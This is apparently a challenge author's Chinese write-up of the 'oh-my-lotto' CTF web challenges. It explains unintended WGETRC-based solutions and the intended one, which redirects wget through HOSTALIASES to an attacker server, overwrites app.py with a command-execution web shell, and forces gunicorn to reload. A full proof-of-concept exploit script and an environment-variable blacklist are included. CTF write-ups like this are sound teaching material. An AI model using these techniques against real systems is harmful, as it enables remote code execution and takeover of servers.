# web-oh-my-lotto&revenge-ZH

## 写在前面的话

因为考虑不周全，这个题可能没给师傅们带来比较好的做题体验，实在抱歉，这里想就这个题给师傅们做一些解释。第一个题被非预期以后，在改revenge的时候思考了很多种方式，比如把`WGETRC`放到黑名单里面，或者是给附件用第一个题的flag加锁，但为了不泄露第一个题的解法，最终我还是选择不把`WGETRC`ban掉，只是把获取flag的方式限制为了必须要RCE才能获取，但同时也由于一些权限管理等问题，使得利用`WGETRC`同样可以解决revenge，这里确实是我没考虑周全，但确实也从师傅们的非预期学到了很多东西，下面我将还原一下我已知的非预期和预期解，希望能带给你新的知识。:)

## 非预期解

### oh-my-lotto

* 利用`WGETRC`设置`http_proxy`代理到自己服务器，下载一个和`forecast`一样的文件，可以获得flag。

* 首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用`PATH`，使得wget异常，这样获取到的lotto就能与forecast相等，即可获得flag。

### oh-my-lotto-revenge

* 利用`WGETRC`配合`http_proxy`和`output_document`，覆盖本地的wget应用，然后利用wget完成RCE。

* 利用`WGETRC`配合`http_proxy`和`output_document`，写入SSTI到templates目录，利用SSTI完成RCE。

## 预期解

根据附件可以在本地搭建题目运行环境，根据源码中`app.py`所述逻辑，当上传的`forecast.txt`文件内容与`lotto_result.txt`文件内容相符时，可以获得flag，lotto容器中生成`lotto_result.txt`使用的是`secrets`库，该库函数使用安全的随机数生成方法，理论上不存在被预测的风险。

发现在进行lotto猜测的时候可以运行输入一次环境变量，该环境变量会被传递给`os.system('wget --content-disposition -N lotto')`，同时环境变量会经过`safe_check`函数检查

```
def safe_check(s):
    if 'LD' in s or 'HTTP' in s or 'BASH' in s or 'ENV' in s or 'PROXY' in s or 'PS' in s:
        return False
    return True
```

一些常见的环境变量利用方法都已经被禁止，通过翻阅Linux环境变量文档`http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html`在Network Settings中发现有`HOSTALIASES`可以设置shell的hosts加载文件，利用`/forecast`路由可以上传待加载的hosts文件，将`wget --content-disposition -N lotto`发向lotto的请求转发到自己的域名例如如下hosts文件

```
# hosts
lotto mydomain.com
```
同时注意到wget请求添加了`--content-disposition -N`参数，说明请求的保存文件名将由服务方提供方指定的文件名决定，并可以覆盖原有的文件，那我们在自己的`mydomain.com`域名的80端口提供一个文件下载的功能，将返回文件名设置为`app.py`就可以覆盖当前题目的`app.py`文件，参考POC

```
from flask import Flask, request, make_response
import mimetypes

app = Flask(__name__)

@app.route("/")
def index():

    r = '''
from flask import Flask,request
import os


app = Flask(__name__)
@app.route("/test", methods=['GET'])
def test():
    a = request.args.get('a')
    a = os.popen(a)
    a = a.read()
    return str(a)

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8080)
'''

    response = make_response(r)
    response.headers['Content-Type'] = 'text/plain'
    response.headers['Content-Disposition'] = 'attachment; filename=app.py'
    return response



if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=8080)
```

此时发现已经覆盖了题目的`app.py`，但并不能直接RCE，因为题目使用gunicorn部署，`app.py`在改变的情况下并不会实时加载。但gunicorn使用一种`pre-forked worker`的机制，当某一个worker超时以后，就会让gunicorn重启该worker，让worker超时的POC如下

```
timeout 50 nc ip 53000 &
timeout 50 nc ip 53000 &
timeout 50 nc ip 53000
```

最终worker重新加载`app.py`，就可以完成RCE了，读取flag即可。参考完整POC如下


```
# exp.py

import requests
import os
import time
import subprocess

s = requests.session()

base_url = 'http://124.223.208.221:53000/'
url_upload = base_url + 'forecast'
proxies = {
    'http': 'http://127.0.0.1:8080'
}

r = s.post(url=url_upload, proxies=proxies, files={"file":("hosts", open('hosts', 'rb'))})
print(r.text)

url_env = base_url + 'lotto'
data = {
    'lotto_key': 'HOSTALIASES',
    'lotto_value': '/app/guess/forecast.txt'
}
r = s.post(url=url_env, data=data)

subprocess.Popen('./exploit.sh', shell=True)
# os.system('./exploit.sh')
for i in range(1, 53):
    print(i)
    time.sleep(1)

while True:
    url_shell = base_url + 'test?a=env'
    print(url_shell)
    r = s.get(url_shell)
    print(r.text)
    if '*ctf' in r.text:
        print(r.text)
        break
```
